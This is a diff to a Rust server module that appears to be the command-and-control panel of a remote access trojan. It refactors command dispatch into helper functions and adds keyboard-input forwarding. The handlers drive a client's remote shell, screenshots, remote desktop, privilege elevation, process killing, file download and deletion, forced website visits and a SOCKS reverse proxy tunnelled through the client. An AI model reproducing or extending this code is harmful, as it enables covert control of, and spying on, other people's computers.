@@ -12,7 +12,7 @@ use rand::Rng;
 use rsa::{pkcs8::ToPublicKey, PaddingScheme, RsaPrivateKey, RsaPublicKey};
 use base64::{engine::general_purpose, Engine as _};
 
-use tokio::{io::{self, AsyncWriteExt, AsyncReadExt}, task, net::{TcpListener, TcpStream}};
+use tokio::{io::{AsyncWriteExt, AsyncReadExt}, net::{TcpListener, TcpStream}};
 use common::socks::MAGIC_FLAG;
 use net2::TcpStreamExt;
 
@@ -25,13 +25,6 @@ use crate::commands::*;
 use common::{ENC_TOK_LEN, RSA_BITS};
 
 use serde::Serialize;
-
-
-#[derive(Debug, Clone, Serialize)]
-struct FrontClientNotification {
-    pub username: String,
-    pub addr: String,
-}
 
 #[derive(Debug, Clone, Serialize)]
 pub struct Log {
@@ -105,8 +98,33 @@ impl ServerWrapper {
     }
     
     async fn emit_client_status(&self, username: &str, addr: &SocketAddr, status: &str) {
+        self.emit_serde_payload(status, serde_json::json!({
+            "username": username.to_string(),
+            "addr": addr.to_string()
+        })).await;
+    }
+
+    async fn emit_serde_payload(&self, event: &str, payload: serde_json::Value) {
         if let Some(handle) = &self.tauri_handle {
-            handle.lock().unwrap().emit_all(status, FrontClientNotification { username: username.clone().to_string(), addr: addr.to_string() }).unwrap_or_else(|e| println!("Failed to emit client_status event: {}", e));
+            handle.lock().unwrap().emit_all(event, payload).unwrap_or_else(|e| println!("Failed to emit payload event: {}", e));
+        } else {
+            println!("Cannot send payload event: Tauri handle not set");
+        }
+    }
+
+    async fn emit_payload(&self, event: &str, payload: &str) {
+        if let Some(handle) = &self.tauri_handle {
+            handle.lock().unwrap().emit_all(event, payload).unwrap_or_else(|e| println!("Failed to emit payload event: {}", e));
+        } else {
+            println!("Cannot send payload event: Tauri handle not set");
+        }
+    }
+
+    async fn send_client_packet(&self, addr: &SocketAddr, packet: ClientboundPacket) {
+        if let Some(tx) = self.txs.get(&addr) {
+            tx.send(ClientCommand::Write(packet.clone()))
+                .await
+                .unwrap_or_else(|e| println!("Failed to send packet {:?}: {}", packet.get_type(), e));
         }
     }
 
@@ -124,7 +142,6 @@ impl ServerWrapper {
                     self.log_events.log_once(log).await;
                 }
                 CloseClientSessions() => {
-                    println!("Closing client sessions");
                     for (addr, tx) in self.txs.iter_mut() {
                         tx.send(ClientCommand::Close).await.unwrap();
                         self.reverse_proxy_tasks.remove(&addr);
@@ -194,11 +211,7 @@ impl ServerWrapper {
 
                     self.log_events.log("cmd_sent", &message).await;
 
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::VisitWebsite(visit_data)))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send visit website request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::VisitWebsite(visit_data)).await;
                 }
                 ShowMessageBox(addr, message_box_data) => {
                     let client = self.connected_users.get(&addr).unwrap();
@@ -206,11 +219,7 @@ impl ServerWrapper {
 
                     self.log_events.log("cmd_sent", &message).await;
 
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::ShowMessageBox(message_box_data)))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send show message box request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::ShowMessageBox(message_box_data)).await;
                 }
                 ElevateClient(addr) => {
                     let client = self.connected_users.get(&addr).unwrap();
@@ -218,11 +227,7 @@ impl ServerWrapper {
 
                     self.log_events.log("cmd_sent", &message).await;
 
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::ElevateClient))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send elevate client request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::ElevateClient).await;
                 }
                 ScreenshotData(addr, screenshot_data) => { 
                     let client = self.connected_users.get(&addr).unwrap();
@@ -232,11 +237,7 @@ impl ServerWrapper {
 
                     let base64_img = general_purpose::STANDARD.encode(&screenshot_data);
                     
-                    if let Some(handle) = &self.tauri_handle {
-                        handle.lock().unwrap().emit_all("client_screenshot", base64_img).unwrap_or_else(|e| println!("Failed to emit client_screenshot event: {}", e));
-                    } else {
-                        println!("Cannot send client_screenshot event: Tauri handle not set");
-                    }
+                    self.emit_payload("client_screenshot", &base64_img).await;
                 }
                 TakeScreenshot(addr, display) => {
                     let client = self.connected_users.get(&addr).unwrap();
@@ -244,11 +245,7 @@ impl ServerWrapper {
 
                     self.log_events.log("cmd_sent", &message).await;
 
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::ScreenshotDisplay(display)))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send screenshot request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::ScreenshotDisplay(display)).await;
                 }
                 GetProcessList(addr) => {
                     let client = self.connected_users.get(&addr).unwrap();
@@ -256,11 +253,7 @@ impl ServerWrapper {
 
                     self.log_events.log("cmd_sent", &message).await;
 
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::GetProcessList))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send get process list request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::GetProcessList).await;
                 }
                 ProcessList(addr, process_list) => {
                     let client = self.connected_users.get(&addr).unwrap();
@@ -273,11 +266,7 @@ impl ServerWrapper {
                         "processes": process_list.processes.clone()
                     });
 
-                    if let Some(handle) = &self.tauri_handle {
-                        handle.lock().unwrap().emit_all("process_list", payload).unwrap_or_else(|e| println!("Failed to emit process_list event: {}", e));
-                    } else {
-                        println!("Cannot send process_list event: Tauri handle not set");
-                    }
+                    self.emit_serde_payload("process_list", payload).await;
                 }
                 KillProcess(addr, process) => {
                     let client = self.connected_users.get(&addr).unwrap();
@@ -285,11 +274,7 @@ impl ServerWrapper {
 
                     self.log_events.log("cmd_sent", &message).await;
 
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::KillProcess(process)))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send kill process request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::KillProcess(process)).await;
                 }
                 StartShell(addr) => {
                     let client = self.connected_users.get(&addr).unwrap();
@@ -297,11 +282,7 @@ impl ServerWrapper {
 
                     self.log_events.log("cmd_sent", &message).await;
 
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::StartShell))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send start shell request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::StartShell).await;
                 }
                 ExitShell(addr) => {
                     let client = self.connected_users.get(&addr).unwrap();
@@ -309,11 +290,7 @@ impl ServerWrapper {
 
                     self.log_events.log("cmd_sent", &message).await;
 
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::ExitShell))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send exit shell request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::ExitShell).await;
                 }
                 ShellCommand(addr, command) => {
                     let client = self.connected_users.get(&addr).unwrap();
@@ -321,11 +298,7 @@ impl ServerWrapper {
 
                     self.log_events.log("cmd_sent", &message).await;
 
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::ShellCommand(command)))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send shell command request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::ShellCommand(command)).await;
                 }
                 ShellOutput(addr, output) => {
                     let client = self.connected_users.get(&addr).unwrap();
@@ -338,11 +311,7 @@ impl ServerWrapper {
                         "shell_output": output.clone()
                     });
 
-                    if let Some(handle) = &self.tauri_handle {
-                        handle.lock().unwrap().emit_all("client_shellout", payload).unwrap_or_else(|e| println!("Failed to emit shell_output event: {}", e));
-                    } else {
-                        println!("Cannot send client_shellout event: Tauri handle not set");
-                    }
+                    self.emit_serde_payload("client_shellout", payload).await;
                 }
                 StartRemoteDesktop(addr, config) => {
                     let client = self.connected_users.get(&addr).unwrap();
@@ -350,11 +319,7 @@ impl ServerWrapper {
 
                     self.log_events.log("cmd_sent", &message).await;
 
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::StartRemoteDesktop(config)))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send start remote desktop request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::StartRemoteDesktop(config)).await;
                 }
                 StopRemoteDesktop(addr) => {
                     let client = self.connected_users.get(&addr).unwrap();
@@ -362,23 +327,13 @@ impl ServerWrapper {
 
                     self.log_events.log("cmd_sent", &message).await;
 
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::StopRemoteDesktop))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send stop remote desktop request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::StopRemoteDesktop).await;
                 }  
                 MouseClick(addr, click_data) => {
-                    let client = self.connected_users.get(&addr).unwrap();
-                    let message = format!("Run Mouse Click on client [{}] [{}]", addr, client.username);
-
-                    self.log_events.log("cmd_sent", &message).await;
-
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::MouseClick(click_data)))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send mouse click request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::MouseClick(click_data)).await;
+                }
+                KeyboardInput(addr, input_data) => {
+                    self.send_client_packet(&addr, ClientboundPacket::KeyboardInput(input_data)).await;
                 }
                 RemoteDesktopFrame(addr, frame) => {
                     let base64_img = general_purpose::STANDARD.encode(&frame.data);
@@ -390,11 +345,7 @@ impl ServerWrapper {
                         "data": base64_img
                     });
                     
-                    if let Some(handle) = &self.tauri_handle {
-                        handle.lock().unwrap().emit_all("remote_desktop_frame", payload).unwrap_or_else(|e| println!("Failed to emit remote_desktop_frame event: {}", e));
-                    } else {
-                        println!("Cannot send remote_desktop_frame event: Tauri handle not set");
-                    }
+                    self.emit_serde_payload("remote_desktop_frame", payload).await;
                 }
                 GetClients(resp) => {
                     let mut clients = Vec::new();
@@ -451,31 +402,19 @@ impl ServerWrapper {
 
                     if let Some(client_info) = self.connected_users.get(&addr) {
                         let username = client_info.username.clone();
-                        println!("Emitting client_disconnected event for {}", username);
                         self.emit_client_status(&username, &addr, "client_disconnected").await;
-                        println!("emitted");
                         let message = format!("Client [{}] {} disconnected!", addr, username);
                         self.log_events.log("client_disconnected", &message).await;
-
-                        println!("crashed?");
                     }
                     
                     self.connected_users.remove(&addr);
                     self.reverse_proxy_tasks.remove(&addr);
                 },
                 DisconnectClient(addr) => {
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::Disconnect))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send disconnect request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::Disconnect).await;
                 }
                 ReconnectClient(addr) => {
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::Reconnect))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send reconnect request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::Reconnect).await;
                 }
                 ManageSystem(addr, command) => {
                     let client = self.connected_users.get(&addr).unwrap();
@@ -483,51 +422,27 @@ impl ServerWrapper {
 
                     self.log_events.log("cmd_sent", &message).await;
 
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::ManageSystem(command)))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send manage system request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::ManageSystem(command)).await;
                 }
 
                 PreviousDir(addr) => {
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::PreviousDir))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send previous dir request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::PreviousDir).await;
                 }
 
                 ViewDir(addr, path) => {
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::ViewDir(path)))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send view dir request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::ViewDir(path)).await;
                 }
 
                 AvailableDisks(addr) => {
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::AvailableDisks))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send available disks request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::AvailableDisks).await;
                 }
 
                 RemoveDir(addr, path) => {
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::RemoveDir(path)))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send remove dir request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::RemoveDir(path)).await;
                 }
 
                 RemoveFile(addr, path) => {
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::RemoveFile(path)))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send remove file request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::RemoveFile(path)).await;
                 }
 
                 DownloadFile(addr, path) => {
@@ -536,11 +451,7 @@ impl ServerWrapper {
 
                     self.log_events.log("cmd_sent", &message).await;
 
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::DownloadFile(path)))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send download file request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::DownloadFile(path)).await;
                 }
 
                 DisksResult(addr, disks) => {
@@ -558,11 +469,7 @@ impl ServerWrapper {
                         "files": files
                     });
                     
-                    if let Some(handle) = &self.tauri_handle {
-                        handle.lock().unwrap().emit_all("files_result", payload).unwrap_or_else(|e| println!("Failed to emit files result event: {}", e));
-                    } else {
-                        println!("Cannot send files result event: Tauri handle not set");
-                    }
+                    self.emit_serde_payload("files_result", payload).await;
                 }
                 
                 FileList(addr, files) => {
@@ -570,14 +477,8 @@ impl ServerWrapper {
                         "addr": addr.to_string(),
                         "files": files
                     });
-
-                    println!("Sending file list: {:?}", payload);
                     
-                    if let Some(handle) = &self.tauri_handle {
-                        handle.lock().unwrap().emit_all("files_result", payload).unwrap_or_else(|e| println!("Failed to emit file list event: {}", e));
-                    } else {
-                        println!("Cannot send file list event: Tauri handle not set");
-                    }
+                    self.emit_serde_payload("files_result", payload).await;
                 }
                 
                 CurrentFolder(addr, path) => {
@@ -586,16 +487,12 @@ impl ServerWrapper {
                         "path": path
                     });
                     
-                    if let Some(handle) = &self.tauri_handle {
-                        handle.lock().unwrap().emit_all("current_folder", payload).unwrap_or_else(|e| println!("Failed to emit current folder event: {}", e));
-                    } else {
-                        println!("Cannot send current folder event: Tauri handle not set");
-                    }
+                    self.emit_serde_payload("current_folder", payload).await;
                 }
                 
                 DownloadFileResult(addr, file_data) => {
                     let client = self.connected_users.get(&addr).unwrap();
-                    let message = format!("Downloaded file from client [{}] [{}]", addr, client.username);
+                    let message: String = format!("Downloaded file from client [{}] [{}]", addr, client.username);
 
                     self.log_events.log("cmd_rcvd", &message).await;
 
@@ -608,24 +505,20 @@ impl ServerWrapper {
 
                     self.log_events.log("cmd_sent", &message).await;
 
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::StartReverseProxy(port.clone())))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send start reverse proxy request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::StartReverseProxy(port.clone())).await;
 
                     let master_addr = format!("{}:{}", "0.0.0.0", port);
                     let socks_addr = format!("{}:{}", "0.0.0.0", local_port);
                     
                     let slave_listener = match TcpListener::bind(&master_addr).await{
-                        Err(e) => {
+                        Err(_e) => {
                             return;
                         },
                         Ok(p) => p
                     };
             
-                    let (slave_stream , slave_addr) = match slave_listener.accept().await{
-                        Err(e) => {
+                    let (slave_stream , _slave_addr) = match slave_listener.accept().await{
+                        Err(_e) => {
                             return;
                         },
                         Ok(p) => p
@@ -636,7 +529,7 @@ impl ServerWrapper {
                     let mut slave_stream = TcpStream::from_std(raw_stream).unwrap();            
                     
                     let listener = match TcpListener::bind(&socks_addr).await{
-                        Err(e) => {
+                        Err(_e) => {
                             return;
                         },
                         Ok(p) => p
@@ -650,12 +543,12 @@ impl ServerWrapper {
                         raw_stream.set_keepalive(Some(std::time::Duration::from_secs(10))).unwrap();
                         let mut stream = TcpStream::from_std(raw_stream).unwrap();
             
-                        if let Err(e) = slave_stream.write_all(&[MAGIC_FLAG[0]]).await{
+                        if let Err(_e) = slave_stream.write_all(&[MAGIC_FLAG[0]]).await{
                             break;
                         };
             
-                        let (proxy_stream , slave_addr) = match slave_listener.accept().await{
-                            Err(e) => {
+                        let (proxy_stream , _slave_addr) = match slave_listener.accept().await{
+                            Err(_e) => {
                                 return;
                             },
                             Ok(p) => p
@@ -666,7 +559,7 @@ impl ServerWrapper {
                         let mut proxy_stream = TcpStream::from_std(raw_stream).unwrap();
             
             
-                        let task = tokio::spawn(async move {
+                        let _task = tokio::spawn(async move {
                             let mut buf1 = [0u8 ; 1024];
                             let mut buf2 = [0u8 ; 1024];
             
@@ -715,23 +608,15 @@ impl ServerWrapper {
 
                     }
                 });
-
-                println!("Inserting reverse proxy task for {}", addr);
                 self.reverse_proxy_tasks.insert(addr, task);
-
                 }
-
                 StopReverseProxy(addr) => {
                     let client = self.connected_users.get(&addr).unwrap();
                     let message = format!("Run Stop Reverse Proxy on client [{}] [{}]", addr, client.username);
 
                     self.log_events.log("cmd_sent", &message).await;
 
-                    if let Some(tx) = self.txs.get(&addr) {
-                        tx.send(ClientCommand::Write(ClientboundPacket::StopReverseProxy))
-                            .await
-                            .unwrap_or_else(|e| println!("Failed to send stop reverse proxy request: {}", e));
-                    }
+                    self.send_client_packet(&addr, ClientboundPacket::StopReverseProxy).await;
 
                     if let Some(task) = self.reverse_proxy_tasks.get(&addr) {
                         task.abort();
@@ -739,8 +624,6 @@ impl ServerWrapper {
 
                     self.reverse_proxy_tasks.remove(&addr);
                 }
-
-
             }
         }
     }
